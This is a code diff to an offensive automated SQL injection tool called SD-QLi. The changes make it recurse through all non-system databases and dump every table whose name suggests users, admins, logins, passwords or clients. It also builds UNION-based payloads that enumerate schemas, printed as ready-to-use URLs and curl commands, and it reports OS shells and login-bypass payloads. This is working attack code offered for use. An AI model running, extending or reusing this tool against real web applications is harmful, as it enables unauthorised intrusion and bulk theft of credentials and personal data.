@@ -160,7 +160,7 @@ class SDQLi:
     ╚════██║██║  ██║ ╚════╝██║▄▄ ██║██║     ██║
     ███████║██████╔╝       ╚██████╔╝███████╗██║
     ╚══════╝╚═════╝         ╚══▀▀═╝ ╚══════╝╚═╝
-    {Colors.END}                 {Colors.BOLD}v2.5 - SD-QLi (Automated Harvester){Colors.END}
+    {Colors.END}                 {Colors.BOLD}v2.7 - SD-QLi (Manual Proofs Edition){Colors.END}
         """
         print(banner)
 
@@ -467,44 +467,42 @@ class SDQLi:
         current_params[param_name] = original_val
 
     def automate_harvest(self, param_name, current_params, col_count, ref_idx, prefix=None):
-        """Automated industrial harvesting logic (v2.3)"""
-        # Prioritize CLI flags
-        if args.dbs:
-            self.get_databases(param_name, current_params, col_count, ref_idx, prefix=prefix)
-        
-        if args.tables:
-            db = args.db or self.results['database'] or "current"
-            self.get_tables(param_name, current_params, col_count, ref_idx, db=db, prefix=prefix)
-            
-        if args.columns:
-            table = args.table
-            if not table: print(f"{Colors.RED}[!] Please specify a table with -T for column enumeration.{Colors.END}")
-            else:
-                db = args.db or self.results['database']
-                self.get_columns(param_name, current_params, col_count, ref_idx, table, db=db, prefix=prefix)
-                
-        if args.dump:
-            table = args.table
-            if not table: print(f"{Colors.RED}[!] Please specify a table with -T for dumping.{Colors.END}")
-            else:
-                db = args.db or self.results['database']
-                cols = args.col.split(',') if args.col else None
-                self.dump_table(param_name, current_params, col_count, ref_idx, table, cols=cols, db=db, prefix=prefix)
+        """Recursive Global Harvesting (v2.6)"""
+        # Prioritize CLI flags (Targeted mode)
+        if any([args.dbs, args.tables, args.columns, args.dump]):
+            if args.dbs: self.get_databases(param_name, current_params, col_count, ref_idx, prefix=prefix)
+            if args.tables:
+                db = args.db or self.results['database'] or "current"
+                self.get_tables(param_name, current_params, col_count, ref_idx, db=db, prefix=prefix)
+            if args.columns:
+                if not args.table: print(f"{Colors.RED}[!] Specify table with -T.{Colors.END}")
+                else: self.get_columns(param_name, current_params, col_count, ref_idx, args.table, db=args.db, prefix=prefix)
+            if args.dump:
+                if not args.table: print(f"{Colors.RED}[!] Specify table with -T.{Colors.END}")
+                else: self.dump_table(param_name, current_params, col_count, ref_idx, args.table, cols=args.col.split(',') if args.col else None, db=args.db, prefix=prefix)
+            return
 
-        # Default discovery if no flags passed
-        if not any([args.dbs, args.tables, args.columns, args.dump]):
-            print(f"[*] {Colors.BOLD}Smart Discovery{Colors.END}: Fetching Databases & Tables...")
-            self.get_databases(param_name, current_params, col_count, ref_idx, prefix=prefix)
-            curr_db = self.results['database'] or "current"
-            self.get_tables(param_name, current_params, col_count, ref_idx, db=curr_db, prefix=prefix)
+        # Global Full-Auto Mode (v2.6 Recursion)
+        print(f"[*] {Colors.BOLD}Global Recursion{Colors.END}: Harvesting all databases...")
+        self.get_databases(param_name, current_params, col_count, ref_idx, prefix=prefix)
+        
+        system_dbs = ['information_schema', 'mysql', 'performance_schema', 'sys']
+        target_dbs = [db for db in self.results['databases'] if db not in system_dbs]
+        
+        if not target_dbs: # Fallback to current if no list found
+            target_dbs = [self.results['database'] or "current"]
+
+        for db in target_dbs:
+            print(f"\n[*] Processing Database: {Colors.BOLD}{Colors.CYAN}{db}{Colors.END}")
+            tables = self.get_tables(param_name, current_params, col_count, ref_idx, db=db, prefix=prefix)
             
-            # v2.5 Smart Auto-Dump Heuristic
-            interesting_keywords = ['user', 'staff', 'admin', 'account', 'member', 'login', 'pass', 'detail']
-            for table in self.results['tables']:
+            # v2.6 Smart-Dump Heuristic (All databases)
+            interesting_keywords = ['user', 'staff', 'admin', 'account', 'member', 'login', 'pass', 'detail', 'client']
+            for table in tables:
                 if any(k in table.lower() for k in interesting_keywords):
                     print(f"[*] {Colors.GREEN}Identifying High-Value table{Colors.END}: {Colors.BOLD}{table}{Colors.END}")
-                    self.dump_table(param_name, current_params, col_count, ref_idx, table, db=curr_db, prefix=prefix)
-                    break # Just dump the first high-value table automatically
+                    self.dump_table(param_name, current_params, col_count, ref_idx, table, db=db, prefix=prefix)
+                    # Don't break here in v2.6, dump all interesting tables in the DB
 
     def blind_manager(self, param_name, current_params):
         """Manages Time-based Blind exfiltration (v2.3 Robust)"""
@@ -622,9 +620,14 @@ class SDQLi:
             if match:
                 tables = match.group(1).split(',')
                 print(f" {Colors.GREEN}[+]{Colors.END} Tables in '{db or 'current'}': {Colors.CYAN}{tables}{Colors.END}")
-                with self.lock: self.results['tables'] = tables
+                with self.lock:
+                    for t in tables:
+                        if f"{db}.{t}" not in self.results['tables']:
+                            self.results['tables'].append(f"{db}.{t}")
+                return tables # v2.6 return local list
             else: pass
         except: pass
+        return []
 
     def get_columns(self, param_name, current_params, col_count, ref_idx, table, db=None, prefix=None):
         """Fetches columns for a table (Industrial-grade)"""
@@ -782,17 +785,16 @@ class SDQLi:
 
         if 'union_info' in self.results:
             u = self.results['union_info']
-            print(f"\n{Colors.GREEN}[+] DATA EXFILTRATION:{Colors.END}")
+            print(f"\n{Colors.GREEN}[+] DATA EXFILTRATION (Global Harvest):{Colors.END}")
             if self.results['database']:
-                print(f"  - Database: {Colors.CYAN}{self.results['database']}{Colors.END}")
-                print(f"  - User:     {Colors.CYAN}{self.results['user']}{Colors.END}")
-                print(f"  - Version:  {Colors.CYAN}{self.results['version']}{Colors.END}")
+                print(f"  - Current DB:   {Colors.CYAN}{self.results['database']}{Colors.END}")
+                print(f"  - Current User: {Colors.CYAN}{self.results['user']}{Colors.END}")
             print(f"  - Columns Found: {u['count']} (Reflected: {u['reflected']})")
             if self.results['databases']:
-                print(f"  - Databases Discovered: {', '.join(self.results['databases'])}")
+                print(f"  - Databases: {Colors.BOLD}{', '.join(self.results['databases'])}{Colors.END}")
             if self.results['tables']:
-                print(f"  - Tables Discovered: {Colors.CYAN}{', '.join(self.results['tables'])}{Colors.END}")
-            print(f"  - Extraction Method: UNION-based exfiltration.")
+                print(f"  - High-Value Tables Processed: {Colors.CYAN}{', '.join(self.results['tables'])}{Colors.END}")
+            print(f"  - Extraction Method: Sequential {Colors.BOLD}UNION-based{Colors.END} Exfiltration.")
         
         if self.results['os_shell']:
             print(f"\n{Colors.GREEN}[+] CREATED OS SHELLS:{Colors.END}")
@@ -803,24 +805,32 @@ class SDQLi:
             print(f"\n{Colors.GREEN}[+] AUTHENTICATION BYPASS:{Colors.END}")
             print(f"  - Working Payload: {Colors.YELLOW}{self.results['bypass_payload']}{Colors.END}")
 
-        print("\n" + "="*70)
-        print(f"{Colors.BOLD}MANUAL REPRODUCTION PROOFS{Colors.END}")
-        print("="*70)
-        for v in self.results['vulnerabilities']:
-            print(f"\n{Colors.YELLOW}[*] {v['type']} ({v['param']}){Colors.END}")
+        if 'union_info' in self.results:
+            u = self.results['union_info']
+            print(f"\n{Colors.YELLOW}[*] Data Exfiltration (Manual Audit){Colors.END}")
+            # Database enumeration proof
+            mk = "SD_DBS"
+            temp_cols = [f"'{i}'" for i in range(1, u['count'] + 1)]
+            temp_cols[u['reflected'][0]-1] = f"CONCAT('{mk}',(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'{mk}')"
+            exfil_payload = f"99999' UNION SELECT {','.join(temp_cols)}-- -"
+            
             if self.method == 'GET':
-                print(f"  Browser: {v.get('url', self.url)}")
+                print(f"  Fetch DBs: {self.url}?{u['param']}={urllib.parse.quote(exfil_payload)}")
             else:
-                curl_data = f"{v['param']}={v['full_payload']}"
-                print(f"  cURL:    curl -X POST -d \"{curl_data}\" {self.url}")
-        
+                curl_data = f"{u['param']}={exfil_payload}"
+                print(f"  Fetch DBs: curl -X POST -d \"{curl_data}\" {self.url}")
+            
+            # Table/Dump proof (Generic template)
+            print(f"  Dumping Details (Template):")
+            print(f"    Payload: {Colors.CYAN}99999' UNION SELECT {['...' if i!=u['reflected'][0] else '(query)' for i in range(1, u['count']+1)]}-- -{Colors.END}")
+
         if self.results['login_bypass']:
             print(f"\n{Colors.YELLOW}[*] Login Bypass{Colors.END}")
             print(f"  Manual:  Inject {self.results['bypass_payload']} into form fields.")
         print("="*70)
 
 def main():
-    parser = argparse.ArgumentParser(description='SD-QLi v2.5 - Industrial Automated SQLi Scanner')
+    parser = argparse.ArgumentParser(description='SD-QLi v2.7 - Manual Proofs Edition')
     parser.add_argument('-u', '--url', help='Target URL')
     parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP Method')
     parser.add_argument('-d', '--data', help='POST data (e.g. "id=1&user=admin")')
